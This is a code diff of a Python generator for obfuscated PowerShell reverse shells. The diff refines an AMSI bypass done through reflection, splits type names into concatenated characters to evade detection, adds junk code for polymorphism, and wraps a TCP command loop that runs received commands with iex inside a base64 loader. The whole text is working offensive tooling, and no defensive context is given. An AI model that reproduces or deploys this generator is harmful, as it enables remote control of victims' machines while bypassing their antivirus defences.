@@ -9,7 +9,7 @@ def rand_name(length=None):
     return ''.join(random.choices(string.ascii_letters, k=length))
 
 def split_string(s):
-    # Obfuscates by turning "System.Text.ASCIIEncoding" into 'S'+'y'+'s'...
+    # Obfuscates: "System.Net.Sockets.TCPClient" -> 'S'+'y'+'s'+...
     return '+'.join([f"'{c}'" for c in s])
 
 def junk_code():
@@ -23,7 +23,7 @@ def junk_code():
     return random.choice(j) + "\n"
 
 def amsi_bypass_reflection(var):
-    # Classic reflection AMSI bypass (obfuscated strings)
+    # Reliable, clean, and still obfuscated
     return (
         f"${var['amsi_type']} = {split_string('AMSI')}\n"
         f"${var['amsi_field']} = [Ref].Assembly.GetType({split_string('System.Management.Automation.')}"
@@ -32,6 +32,10 @@ def amsi_bypass_reflection(var):
         f"${var['amsi_failed']}.SetValue($null,$true)\n"
     )
 
+def obf_type(type_name):
+    # Returns ([string]'S'+'y'+'s'+'t'+'e'+'m'...)
+    return f"([string]{split_string(type_name)})"
+
 def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
     var = {k: rand_name() for k in [
         "amsi_type", "amsi_field", "amsi_failed", "tcpclient", "stream", "bytes", "i", "data", "sendback",
@@ -39,30 +43,28 @@ def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
     ]}
     amsi_bypass = amsi_bypass_reflection(var)
 
-    # --- The Fully Fixed, Reliable Core Shell ---
-    tcpclient_str = split_string('System.Net.Sockets.TCPClient')
-    asciiencoding_str = split_string('System.Text.ASCIIEncoding')
-
+    # --- The Correct, Fully Obfuscated Reverse Shell ---
     core_shell = (
         junk_code() +
-        f"${var['tcpclient']}_typename = {tcpclient_str}\n"
-        f"${var['tcpclient']} = New-Object -TypeName ([string]${var['tcpclient']}_typename) -ArgumentList '{host}',{port}\n"
+        # Declare the type name for TCPClient
+        f"${var['tcpclient']}_type = {split_string('System.Net.Sockets.TCPClient')}\n"
+        # New-Object with TypeName ([string]...) -- prevents PowerShell from treating it as an array
+        f"${var['tcpclient']} = New-Object -TypeName ([string]${var['tcpclient']}_type) -ArgumentList '{host}',{port}\n"
         f"${var['stream']} = ${{{var['tcpclient']}}}.GetStream()\n"
         f"${var['bytes']} = 0..65535|%{{0}}\n"
         f"while((${{var['i']}} = ${{{var['stream']}}}.Read(${{{var['bytes']}}},0,${{{var['bytes']}}}.Length)) -ne 0){{\n"
-        f"    ${{var['data']}} = (New-Object -TypeName ([string]{asciiencoding_str})).GetString(${{{var['bytes']}}},0,${{{var['i']}}})\n"
-        f"    ${{var['sendback']}} = (iex ${{{var['data']}}} 2>&1 | Out-String)\n"
-        f"    ${{var['sendback2']}} = ${{{var['sendback']}}} + \"PS \" + (pwd).Path + \"> \"\n"
-        f"    ${{var['sendbyte']}} = ([Text.Encoding]::ASCII).GetBytes(${{{var['sendback2']}}})\n"
+        # ASCIIEncoding type obfuscated
+        f"    ${var['data']} = (New-Object -TypeName {obf_type('System.Text.ASCIIEncoding')}).GetString(${{{var['bytes']}}},0,${{{var['i']}}})\n"
+        f"    ${var['sendback']} = (iex ${{{var['data']}}} 2>&1 | Out-String)\n"
+        f"    ${var['sendback2']} = ${{{var['sendback']}}} + 'PS ' + (pwd).Path + '> '\n"
+        f"    ${var['sendbyte']} = ([Text.Encoding]::ASCII).GetBytes(${{{var['sendback2']}}})\n"
         f"    ${{{var['stream']}}}.Write(${{{var['sendbyte']}}},0,${{{var['sendbyte']}}}.Length)\n"
         f"    ${{{var['stream']}}}.Flush()\n"
         "}\n" +
         junk_code()
     )
 
-
-
-    # --- Loader: Uses base64 for stealth, minimal obfuscation here ---
+    # --- Loader: base64 only ---
     core_shell_bytes = core_shell.encode('utf-8')
     core_shell_b64 = base64.b64encode(core_shell_bytes).decode()
     loader_var = rand_name()
@@ -86,4 +88,5 @@ def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
     else:
         return ps
 
+# Alias for your other code
 generate_polymorphic_ps = generate_obfuscated_ps
